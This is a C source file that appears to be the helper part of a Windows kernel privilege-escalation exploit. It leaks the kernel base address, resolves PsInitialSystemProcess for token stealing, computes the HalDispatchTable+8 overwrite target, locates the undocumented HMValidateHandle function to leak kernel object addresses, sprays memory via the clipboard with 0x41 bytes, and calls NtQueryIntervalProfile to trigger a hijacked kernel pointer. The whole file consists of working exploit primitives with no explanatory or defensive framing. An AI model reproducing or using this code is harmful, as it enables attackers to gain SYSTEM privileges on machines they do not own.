#include "base.h"

VOID ShowError(char *str, DWORD dwErrorCode)
{
	printf("%s Error 0x%X\n", str, dwErrorCode);
}

BOOL CreateClipboard(DWORD dwSize)
{
	BOOL bRet = TRUE;
	PCHAR pBuffer = NULL;
	HGLOBAL hMem = NULL;

	pBuffer = (PCHAR)malloc(dwSize);
	if (!pBuffer)
	{
		ShowError("malloc", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	ZeroMemory(pBuffer, dwSize);
	FillMemory(pBuffer, dwSize, 0x41);

	hMem = GlobalAlloc(GMEM_MOVEABLE, dwSize);
	if (hMem == NULL)
	{
		ShowError("GlobalAlloc", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	CopyMemory(GlobalLock(hMem), pBuffer, dwSize);

	GlobalUnlock(hMem);

	SetClipboardData(CF_TEXT, hMem);
exit:
	return bRet;
}

ULONG64 GetNTBase()
{
	ULONG64 Base[0x1000];
	DWORD dwRet = 0;
	ULONG64 ulKrnlBase = 0;

	if (EnumDeviceDrivers((LPVOID*)&Base, sizeof(Base), &dwRet))
	{
		ulKrnlBase = Base[0];
	}
	else
	{
		ShowError("EnumDeviceDrivers", GetLastError());
	}

	return ulKrnlBase;
}

ULONG64 GetSystemProcess()
{
	HMODULE hModel = NULL;
	ULONG64 ulAddress = 0, ulOSBase = 0, ulRes = 0;

	ulOSBase = GetNTBase();
	if (ulOSBase == 0)
	{
		goto exit;
	}

	hModel = LoadLibrary("ntoskrnl.exe");
	if (!hModel)
	{
		ShowError("LoadLibrary", GetLastError());
		goto exit;
	}

	ulAddress = (ULONG64)GetProcAddress(hModel, "PsInitialSystemProcess");
	if (!ulAddress)
	{
		ShowError("GetProcAddress", GetLastError());
		goto exit;
	}

	ulRes = ulAddress - (ULONG64)hModel + ulOSBase;

exit:
	return ulRes;
}

PVOID GetHMValidateHandle()
{
	PVOID pFuncAddr = NULL;
	HMODULE hUser32 = NULL;
	PBYTE pIsMenu = NULL;
	DWORD i = 0, dwFuncAddrOffset = 0;

	hUser32 = LoadLibrary("user32.dll");
	if (!hUser32)
	{
		ShowError("LoadLibrary", GetLastError());
		goto exit;
	}

	pIsMenu = (PBYTE)GetProcAddress(hUser32, "IsMenu");
	if (!pIsMenu)
	{
		ShowError("GetProcAddress", GetLastError());
		goto exit;
	}

	for (i = 0; i < PAGE_SIZE; i++)
	{
		if (pIsMenu[i] == 0xE8)
		{
			dwFuncAddrOffset = *(PDWORD)(pIsMenu + i + 1);
			pFuncAddr = (PVOID)(dwFuncAddrOffset + (DWORD)pIsMenu + i + 5);
			break;
		}
	}

exit:
	return pFuncAddr;
}

PVOID GetHalQuerySystemInformation()
{
	PVOID pXHalQuerySystemInformation = NULL;
	ULONG64 ulHalDispatchTable = 0;
	HMODULE hKernel = NULL;
	ULONG64 ulOsBase = 0;

	ulOsBase = GetNTBase();
	if (!ulOsBase)
	{
		goto exit;
	}

	hKernel = LoadLibrary("ntoskrnl.exe");
	if (!hKernel)
	{
		ShowError("LoadLibrary", GetLastError());
		goto exit;
	}

	// 获取内核HalDispatchTable函数表地址
	ulHalDispatchTable = (ULONG64)GetProcAddress((HMODULE)hKernel, "HalDispatchTable");

	if (!ulHalDispatchTable)
	{
		ShowError("GetProcAddress", GetLastError());
		goto exit;
	}

	ulHalDispatchTable = ulHalDispatchTable - (ULONG64)hKernel + ulOsBase;
	pXHalQuerySystemInformation = (PVOID)(ulHalDispatchTable + sizeof(ULONG64));

exit:
	if (hKernel) FreeLibrary(hKernel);

	return pXHalQuerySystemInformation;
}

BOOL CallNtQueryIntervalProfile()
{
	BOOL bRet = TRUE;
	NTSTATUS status = 0;
	HMODULE hDll = NULL;

	hDll = LoadLibrary("ntdll.dll");
	if (!hDll)
	{
		bRet = FALSE;
		ShowError("LoadLibrary", GetLastError());
		goto exit;
	}

	lpfnNtQueryIntervalProfile NtQueryIntervalProfile = (lpfnNtQueryIntervalProfile)GetProcAddress(hDll, "NtQueryIntervalProfile");

	if (!NtQueryIntervalProfile)
	{
		bRet = FALSE;
		ShowError("MyNtQueryIntervalProfile", GetLastError());
		goto exit;
	}

	DWORD dwRet = 0;
	DWORD dwProfileTotalIssues = 0x3;
	status = NtQueryIntervalProfile(dwProfileTotalIssues, &dwRet);
	if (status < 0)
	{
		ShowError("NtQueryIntervalProfile", status);
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}